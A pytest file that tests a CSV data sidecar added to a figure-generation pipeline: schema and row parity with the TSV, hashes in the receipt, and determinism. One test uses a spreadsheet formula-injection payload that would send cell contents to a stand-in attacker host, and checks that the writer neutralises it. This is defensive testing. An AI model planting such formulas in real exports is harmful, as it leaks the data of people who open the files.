"""CLAUDE_410 ff csv sidecar — the Figure Factory Next plotted-data sidecar is emitted as a
comma-delimited `.csv` twin of the existing `.tsv`, so the R/ggplot2 figure templates (which read
`_data.csv`) consume it uniformly with the rest of the figure set.

Additive check: the `.csv` carries the same tidy schema and rows as the `.tsv`, is listed in the
receipt outputs with its own hash, and the pre-existing `.tsv` output hash is unchanged.

Co-apply: this lane is independent of CLAUDE_409_robustness_caps_r2 (touches only
mamey/figure_factory_next.py), but ships in the v9.7.410 set alongside CLAUDE_410_savefig_oom_sweep,
which does depend on r2.
"""
from __future__ import annotations

import csv
import hashlib
import json
from pathlib import Path

from mamey.figure_factory_next import build


def _sha(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def _write_tsv(path: Path, fields: list[str], rows: list[list[object]]) -> None:
    with path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.writer(handle, delimiter="\t", lineterminator="\n")
        writer.writerow(fields)
        writer.writerows(rows)


def _fixture(tmp_path: Path, *, output_dir: str = "outputs-a") -> Path:
    root = tmp_path / "external"
    root.mkdir(exist_ok=True)
    metrics = root / "metrics.tsv"
    manifest = root / "cohort_manifest.tsv"
    _write_tsv(
        metrics,
        ["identity", "channel", "metric", "numerator", "denominator", "denominator_key"],
        [
            ["study-alpha-one", "alignment", "coverage", 9, 10, "declared-features"],
            ["study-alpha-two", "alignment", "coverage", 7, 10, "declared-features"],
            ["study-beta-one", "alignment", "coverage", 4, 5, "declared-features"],
            ["held-alpha-one", "alignment", "coverage", 3, 5, "declared-features"],
            ["benchmark-alpha-one", "alignment", "coverage", 4, 5, "declared-features"],
            ["reference-alpha-one", "alignment", "coverage", 2, 5, "declared-features"],
        ],
    )
    _write_tsv(
        manifest,
        ["identity", "role", "include_by_default", "genus", "cohort",
         "assembly_state", "assembly_reason"],
        [
            ["study-alpha-one", "STUDY", "true", "Genus alpha", "BEE", "PASS", "assembly checks passed"],
            ["study-alpha-two", "STUDY", "true", "Genus alpha", "WASP", "FLAG", "fragmentation overlay required"],
            ["study-beta-one", "STUDY", "true", "Genus beta", "ATTINE", "PASS", "assembly checks passed"],
            ["held-alpha-one", "STUDY", "false", "Genus alpha", "MOSS", "DEFAULT_OFF", "assembly outlier held by policy"],
            ["benchmark-alpha-one", "EXTERNAL_BENCHMARK", "false", "Genus alpha", "EXTERNAL_BENCHMARK", "PASS", "benchmark only"],
            ["reference-alpha-one", "REFERENCE", "false", "Genus alpha", "REFERENCE", "PASS", "reference only"],
        ],
    )
    config = {
        "schema_version": "sapote.figure-factory-next.v2",
        "external_data_root": str(root),
        "output_dir": output_dir,
        "title": "Generic evidence readiness",
        "figure_question": "How much of each declared generic evidence channel is observed?",
        "source_release": "generic-fixture-v1",
        "software_versions": "figure-factory-next candidate v2",
        "inputs": [
            {"role": "aggregate_metrics", "logical_locator": "metrics.tsv", "sha256": _sha(metrics)},
            {"role": "cohort_manifest", "logical_locator": "cohort_manifest.tsv", "sha256": _sha(manifest)},
        ],
        "comparison": {
            "default_genera": ["Genus alpha"],
            "optional_genera": ["Genus beta"],
            "selected_optional_genera": [],
            "selected_optional_identities": ["held-alpha-one", "benchmark-alpha-one"],
        },
        "owner_notes": ["Internal layout preference; never scientific caption text."],
    }
    path = tmp_path / f"config-{output_dir}.json"
    path.write_text(json.dumps(config), encoding="utf-8")
    return path


def test_csv_sidecar_matches_tsv_schema_and_rows(tmp_path: Path) -> None:
    receipt = build(_fixture(tmp_path, output_dir="outputs-a"))
    out = tmp_path / "outputs-a"
    tsv_path = out / "figure_factory_next_data.tsv"
    csv_path = out / "figure_factory_next_data.csv"

    # The csv twin is emitted next to the tsv.
    assert csv_path.exists(), "figure_factory_next_data.csv was not written"

    # Same tidy schema and same rows, only the delimiter differs.
    with tsv_path.open(newline="", encoding="utf-8") as fh:
        tsv_rows = list(csv.DictReader(fh, delimiter="\t"))
    with csv_path.open(newline="", encoding="utf-8") as fh:
        csv_reader = csv.DictReader(fh, delimiter=",")
        csv_rows = list(csv_reader)
        csv_fields = csv_reader.fieldnames
    assert csv_fields == list(tsv_rows[0].keys())
    assert csv_rows == tsv_rows
    assert len(csv_rows) == len(tsv_rows) > 0

    # It really is comma-delimited (a single-field tab parse keeps the whole header in col 0).
    header_line = csv_path.read_text(encoding="utf-8").splitlines()[0]
    assert "," in header_line and "\t" not in header_line
    # Deterministic newline (matches the tsv writer): no CR bytes on any platform.
    assert b"\r" not in csv_path.read_bytes()


def test_csv_sidecar_in_receipt_and_tsv_hash_unchanged(tmp_path: Path) -> None:
    receipt = build(_fixture(tmp_path, output_dir="outputs-a"))
    hashes = {row["logical_locator"]: row["sha256"] for row in receipt["outputs"]}
    out = tmp_path / "outputs-a"

    # Both sidecars are provenance-tracked outputs.
    assert "figure_factory_next_data.csv" in hashes
    assert "figure_factory_next_data.tsv" in hashes

    # The receipt hashes match the bytes actually on disk.
    assert hashes["figure_factory_next_data.csv"] == _sha(out / "figure_factory_next_data.csv")
    # Pre-existing tsv output hash equals the file on disk (the sidecar add did not disturb it).
    assert hashes["figure_factory_next_data.tsv"] == _sha(out / "figure_factory_next_data.tsv")


def test_csv_sidecar_deterministic_across_runs(tmp_path: Path) -> None:
    first = build(_fixture(tmp_path, output_dir="outputs-a"))
    second = build(_fixture(tmp_path, output_dir="outputs-b"))
    first_h = {r["logical_locator"]: r["sha256"] for r in first["outputs"]}
    second_h = {r["logical_locator"]: r["sha256"] for r in second["outputs"]}
    assert first_h["figure_factory_next_data.csv"] == second_h["figure_factory_next_data.csv"]


def test_csv_sidecar_writer_neutralises_formula_injection(tmp_path: Path) -> None:
    """The sidecar is opened directly in Excel/LibreOffice and read by the R templates, so it must
    go through the shipped csv_safety writer, not a plain csv.DictWriter. A leading formula
    character is prefixed with `'`; ordinary text and signed numbers pass through untouched."""
    from mamey.figure_factory_next import _write_csv

    target = tmp_path / "sidecar.csv"
    fields = ["identity", "note", "value", "strand"]
    _write_csv(target, fields, [
        {"identity": "study-alpha-one",
         "note": '=HYPERLINK("http://evil.example/"&A1,"x")',
         "value": "-1.5", "strand": "-"},
    ])
    text = target.read_text(encoding="utf-8")
    assert "\n=HYPERLINK" not in text and ",=HYPERLINK" not in text
    assert "\"'=HYPERLINK" in text
    row = list(csv.DictReader(target.open(newline="", encoding="utf-8")))[0]
    # Non-formula cells are byte-identical: numeric round-trip and the strand column are preserved.
    assert row["identity"] == "study-alpha-one"
    assert float(row["value"]) == -1.5
    assert row["strand"] == "-"
